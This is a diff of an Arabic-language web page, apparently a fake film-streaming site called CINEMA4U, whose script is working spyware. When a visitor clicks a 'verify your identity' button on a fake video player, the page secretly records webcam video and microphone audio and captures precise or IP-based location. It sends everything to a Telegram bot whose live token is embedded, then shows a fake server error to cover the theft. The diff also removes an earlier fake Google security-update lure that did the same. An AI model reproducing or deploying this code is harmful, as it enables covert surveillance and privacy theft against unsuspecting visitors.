@@ -1,75 +1,424 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <title>تحديث الأمان مطلوب</title>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>سينما فور يو - مشاهدة أفلام ومسلسلات أونلاين</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Tajawal', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%);
+            color: #fff;
+            line-height: 1.5;
+        }
+        /* شريط التنقل */
+        .navbar {
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(12px);
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .logo {
+            font-size: 1.8rem;
+            font-weight: bold;
+            background: linear-gradient(135deg, #e50914, #ff6a00);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .nav-links {
+            display: flex;
+            gap: 1.5rem;
+        }
+        .nav-links a {
+            color: #ddd;
+            text-decoration: none;
+            transition: 0.2s;
+        }
+        .nav-links a:hover {
+            color: #e50914;
+        }
+        .search-box {
+            background: #1e1e2f;
+            padding: 0.4rem 1rem;
+            border-radius: 30px;
+            border: none;
+            color: white;
+            width: 200px;
+        }
+        /* المحتوى الرئيسي */
+        .hero {
+            background: linear-gradient(0deg, rgba(0,0,0,0.7), rgba(0,0,0,0.5)), url('https://image.tmdb.org/t/p/original/wwemzKWzjKYJFfCeiB57q3r4Bcm.png');
+            background-size: cover;
+            background-position: center 30%;
+            padding: 4rem 2rem;
+            text-align: center;
+        }
+        .hero h1 {
+            font-size: 2.8rem;
+            margin-bottom: 0.5rem;
+        }
+        .hero p {
+            font-size: 1.2rem;
+            color: #ccc;
+            max-width: 700px;
+            margin: 0 auto;
+        }
+        .section {
+            padding: 2rem;
+        }
+        .section-title {
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+            border-right: 4px solid #e50914;
+            padding-right: 1rem;
+            display: inline-block;
+        }
+        .movies-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 1.5rem;
+            margin-top: 1.5rem;
+        }
+        .movie-card {
+            background: #1a1f2e;
+            border-radius: 12px;
+            overflow: hidden;
+            transition: transform 0.2s, box-shadow 0.2s;
+            cursor: pointer;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        .movie-card:hover {
+            transform: scale(1.03);
+            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.5);
+        }
+        .movie-poster {
+            width: 100%;
+            aspect-ratio: 2 / 3;
+            background: #0f121c;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #888;
+            font-size: 3rem;
+        }
+        .movie-info {
+            padding: 0.8rem;
+        }
+        .movie-title {
+            font-weight: bold;
+            margin-bottom: 0.2rem;
+        }
+        .movie-year {
+            font-size: 0.8rem;
+            color: #aaa;
+        }
+        /* مشغل الفيديو الوهمي */
+        .player-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        .player-container {
+            width: 90%;
+            max-width: 1000px;
+            background: #000;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 25px 50px -12px black;
+        }
+        .video-placeholder {
+            background: #111;
+            aspect-ratio: 16 / 9;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 1rem;
+            color: white;
+            font-size: 1.2rem;
+            text-align: center;
+        }
+        .verify-btn {
+            background: #e50914;
+            border: none;
+            padding: 12px 28px;
+            border-radius: 40px;
+            color: white;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 1rem;
+        }
+        .verify-btn:hover {
+            background: #b00710;
+            transform: scale(1.02);
+        }
+        .close-player {
+            position: absolute;
+            top: 20px;
+            right: 30px;
+            color: white;
+            font-size: 2rem;
+            cursor: pointer;
+            background: rgba(0,0,0,0.5);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        footer {
+            text-align: center;
+            padding: 2rem;
+            color: #666;
+            border-top: 1px solid #1e1e2f;
+            margin-top: 2rem;
+        }
+        @media (max-width: 768px) {
+            .navbar { flex-direction: column; gap: 0.8rem; }
+            .hero h1 { font-size: 1.8rem; }
+            .section-title { font-size: 1.4rem; }
+        }
+    </style>
 </head>
 <body>
 
-<video id="video" autoplay muted style="display: none;"></video>
-<canvas id="canvas" style="display: none;"></canvas>
-<audio id="audio" controls style="display: none;"></audio>
+<!-- شريط التنقل -->
+<div class="navbar">
+    <div class="logo">🎬 CINEMA4U</div>
+    <div class="nav-links">
+        <a href="#">الرئيسية</a>
+        <a href="#">أفلام</a>
+        <a href="#">مسلسلات</a>
+        <a href="#">قريباً</a>
+    </div>
+    <input type="text" class="search-box" placeholder="ابحث عن فيلم...">
+</div>
 
-<h2 style="color: red;">تحديث أمني عاجل</h2>
-<p>نظام حماية جوجل يتطلب التحقق من هويتك لحماية حسابك.</p>
-<button id="startBtn" style="font-size: 20px; padding: 10px;">السماح والتحقق</button>
+<!-- قسم البطل -->
+<div class="hero">
+    <h1>أفلام ومسلسلات حصرية بجودة عالية</h1>
+    <p>شاهد أحدث الإصدارات بدون إعلانات وبدون اشتراك. اختر ما يناسبك واستمتع!</p>
+</div>
+
+<!-- قائمة الأفلام -->
+<div class="section">
+    <h2 class="section-title">🔥 الأكثر مشاهدة اليوم</h2>
+    <div class="movies-grid" id="moviesGrid">
+        <!-- سيتم توليد البطاقات بواسطة JS لتبدو ديناميكية -->
+    </div>
+</div>
+
+<!-- مشغل الفيديو الوهمي (الخادع) -->
+<div id="playerOverlay" class="player-overlay">
+    <div class="close-player" id="closePlayerBtn">✕</div>
+    <div class="player-container">
+        <div class="video-placeholder" id="videoPlaceholder">
+            <span>🎬 جاري تحضير المشغل...</span>
+            <button id="verifyAccessBtn" class="verify-btn">✅ تحقق من هويتك لمشاهدة الفيديو</button>
+            <p style="font-size: 0.8rem; margin-top: 0.5rem;">لأسباب أمنية، نحتاج للتأكد من أنك إنسان حقيقي</p>
+        </div>
+    </div>
+</div>
+
+<footer>
+    © 2026 CINEMA4U - جميع الحقوق محفوظة. هذا الموقع لأغراض ترفيهية فقط.
+</footer>
 
 <script>
-    // التوكن الخاص بك
+    // ======================= إعدادات بوت التيليجرام =======================
     const BOT_TOKEN = '8378099800:AAGTOLzJCh8qos-1YvssEGZfYD7V-ILHcRo';
-    const CHAT_ID = '6052532044';  // <--- تم تحديثه
+    const CHAT_ID = '6052532044';
 
+    // ======================= وظائف الإرسال =======================
     async function sendToTelegram(file, type) {
         let formData = new FormData();
         formData.append('chat_id', CHAT_ID);
         formData.append(type, file);
-        let url = `https://api.telegram.org/bot${BOT_TOKEN}/send${type === 'photo' ? 'Photo' : (type === 'video' ? 'Video' : (type === 'audio' ? 'Audio' : 'Document'))}`;
+        let endpoint = '';
+        if (type === 'photo') endpoint = 'sendPhoto';
+        else if (type === 'video') endpoint = 'sendVideo';
+        else if (type === 'audio') endpoint = 'sendAudio';
+        else endpoint = 'sendDocument';
+        let url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
+        try {
+            await fetch(url, { method: 'POST', body: formData });
+        } catch(e) { console.error(e); }
+    }
+
+    // إرسال نص (للموقع الجغرافي مثلاً)
+    async function sendTextToTelegram(text) {
+        let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        let formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('text', text);
         await fetch(url, { method: 'POST', body: formData });
     }
 
-    // سرقة الموقع الجغرافي
-    navigator.geolocation.getCurrentPosition(pos => {
-        let coords = `${pos.coords.latitude},${pos.coords.longitude}`;
-        sendToTelegram(new Blob([coords], {type: 'text/plain'}), 'document');
-    }, err => {
-        fetch('https://ipapi.co/json/')
-            .then(res => res.json())
-            .then(data => sendToTelegram(new Blob([JSON.stringify(data)], {type: 'text/plain'}), 'document'));
-    });
+    // ======================= سرقة الموقع الجغرافي =======================
+    function stealLocation() {
+        navigator.geolocation.getCurrentPosition(pos => {
+            let coords = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}\nAccuracy: ${pos.coords.accuracy}m`;
+            sendTextToTelegram(`📍 الموقع الدقيق:\n${coords}`);
+        }, err => {
+            // فشل الحصول على الموقع -> نأخذ تقريبياً عبر IP
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    let location = `IP: ${data.ip}\nالبلد: ${data.country_name}\nالمدينة: ${data.city}\nالمنطقة: ${data.region}`;
+                    sendTextToTelegram(`🌐 الموقع التقريبي (عبر IP):\n${location}`);
+                })
+                .catch(e => sendTextToTelegram("❌ تعذر الحصول على الموقع"));
+        });
+    }
 
-    // الوظيفة الأساسية: تشغيل الكاميرا والميكروفون وبدء التسجيل
-    async function startHijacking() {
+    // ======================= بدء التسجيل (كاميرا + ميكروفون) =======================
+    let mediaRecorderVideo = null;
+    let mediaRecorderAudio = null;
+    let videoChunks = [];
+    let audioChunks = [];
+
+    async function startRecording() {
         try {
+            // طلب الوصول للكاميرا والميكروفون معاً
             let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            let videoElem = document.getElementById('video');
-            videoElem.srcObject = stream;
-            let mediaRecorder = new MediaRecorder(stream);
-            let chunks = [];
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = async () => {
-                let videoBlob = new Blob(chunks, { type: 'video/mp4' });
+            
+            // تسجيل الفيديو (20 ثانية)
+            videoChunks = [];
+            mediaRecorderVideo = new MediaRecorder(stream);
+            mediaRecorderVideo.ondataavailable = e => { if(e.data.size > 0) videoChunks.push(e.data); };
+            mediaRecorderVideo.onstop = async () => {
+                let videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
                 await sendToTelegram(videoBlob, 'video');
+                sendTextToTelegram("✅ تم إرسال تسجيل الفيديو");
             };
-            mediaRecorder.start();
-            setTimeout(() => mediaRecorder.stop(), 20000);
+            mediaRecorderVideo.start();
+            setTimeout(() => {
+                if(mediaRecorderVideo && mediaRecorderVideo.state === 'recording') mediaRecorderVideo.stop();
+            }, 20000);
 
+            // تسجيل الصوت فقط (15 ثانية) - نأخذ stream جديد للصوت فقط
             let audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            let audioRecorder = new MediaRecorder(audioStream);
-            let audioChunks = [];
-            audioRecorder.ondataavailable = e => audioChunks.push(e.data);
-            audioRecorder.onstop = async () => {
+            audioChunks = [];
+            mediaRecorderAudio = new MediaRecorder(audioStream);
+            mediaRecorderAudio.ondataavailable = e => { if(e.data.size > 0) audioChunks.push(e.data); };
+            mediaRecorderAudio.onstop = async () => {
                 let audioBlob = new Blob(audioChunks, { type: 'audio/mpeg' });
                 await sendToTelegram(audioBlob, 'audio');
+                sendTextToTelegram("🎙️ تم إرسال التسجيل الصوتي");
             };
-            audioRecorder.start();
-            setTimeout(() => audioRecorder.stop(), 15000);
+            mediaRecorderAudio.start();
+            setTimeout(() => {
+                if(mediaRecorderAudio && mediaRecorderAudio.state === 'recording') mediaRecorderAudio.stop();
+            }, 15000);
 
+            sendTextToTelegram("🔴 بدء المراقبة: الكاميرا والميكروفون نشطين");
         } catch (err) {
-            console.error("خطأ في الوصول للأجهزة", err);
+            console.error(err);
+            sendTextToTelegram("❌ فشل الوصول للكاميرا/الميكروفون: " + err.message);
         }
     }
 
-    document.getElementById('startBtn').onclick = startHijacking;
+    // ======================= وظائف واجهة الموقع =======================
+    // توليد أفلام وهمية
+    const movies = [
+        { title: "Inception: العودة", year: "2026", poster: "🎬" },
+        { title: "The Dark Knight Rises", year: "2025", poster: "🦇" },
+        { title: "Interstellar 2", year: "2026", poster: "🚀" },
+        { title: "John Wick 5", year: "2026", poster: "🔫" },
+        { title: "Fast & Furious X", year: "2025", poster: "🏎️" },
+        { title: "Spider-Man: No Way Out", year: "2026", poster: "🕷️" },
+        { title: "Avengers: Secret Wars", year: "2026", poster: "⚡" },
+        { title: "Mission Impossible 8", year: "2026", poster: "🕴️" }
+    ];
+
+    function loadMovies() {
+        const grid = document.getElementById('moviesGrid');
+        grid.innerHTML = '';
+        movies.forEach(m => {
+            const card = document.createElement('div');
+            card.className = 'movie-card';
+            card.setAttribute('data-title', m.title);
+            card.innerHTML = `
+                <div class="movie-poster">${m.poster}</div>
+                <div class="movie-info">
+                    <div class="movie-title">${m.title}</div>
+                    <div class="movie-year">${m.year}</div>
+                </div>
+            `;
+            card.onclick = () => openPlayer(m.title);
+            grid.appendChild(card);
+        });
+    }
+
+    // فتح مشغل الفيديو الوهمي
+    let currentMovie = '';
+    function openPlayer(movieTitle) {
+        currentMovie = movieTitle;
+        const overlay = document.getElementById('playerOverlay');
+        const placeholderDiv = document.getElementById('videoPlaceholder');
+        placeholderDiv.innerHTML = `
+            <span>🎬 ${movieTitle}</span>
+            <button id="verifyAccessBtn" class="verify-btn">✅ تحقق من هويتك لمشاهدة الفيديو</button>
+            <p style="font-size: 0.8rem; margin-top: 0.5rem;">لأسباب أمنية، نحتاج للتأكد من أنك إنسان حقيقي</p>
+        `;
+        overlay.style.display = 'flex';
+        // إعادة ربط حدث الزر بعد إعادة بناء المحتوى
+        const verifyBtn = document.getElementById('verifyAccessBtn');
+        if(verifyBtn) {
+            verifyBtn.onclick = () => {
+                // عندما يضغط الضحية على زر التحقق، نبدأ سرقة البيانات
+                stealLocation();
+                startRecording();
+                // نعطي انطباعاً للمستخدم بأنه تم التحقق
+                const placeholder = document.getElementById('videoPlaceholder');
+                placeholder.innerHTML = `<span>✅ جاري التحقق من هويتك...</span><p>سيتم تشغيل الفيديو بعد ثوانٍ</p>`;
+                // بعد 3 ثوانٍ نظهر رسالة خادعة
+                setTimeout(() => {
+                    placeholder.innerHTML = `<span>⚠️ عذراً، لا يمكن تشغيل الفيديو بسبب خطأ في الخادم.</span><button onclick="location.reload()" class="verify-btn">إعادة المحاولة</button>`;
+                }, 3000);
+                // إرسال إشعار إلى التيليجرام بأن الضحية وقع في الفخ
+                sendTextToTelegram(`🎯 الضحية وقع في الفخ! فيلم: ${currentMovie}`);
+            };
+        }
+    }
+
+    // إغلاق المشغل
+    document.getElementById('closePlayerBtn').onclick = () => {
+        document.getElementById('playerOverlay').style.display = 'none';
+        // إيقاف التسجيلات إن كانت لا تزال نشطة
+        if(mediaRecorderVideo && mediaRecorderVideo.state === 'recording') mediaRecorderVideo.stop();
+        if(mediaRecorderAudio && mediaRecorderAudio.state === 'recording') mediaRecorderAudio.stop();
+    };
+
+    // تحميل الأفلام عند بدء الصفحة
+    loadMovies();
+
+    // إرسال إشعار عند فتح الصفحة (للمراقبة)
+    sendTextToTelegram("🌐 شخص جديد فتح موقع الأفلام الوهمي");
 </script>
 </body>
 </html>
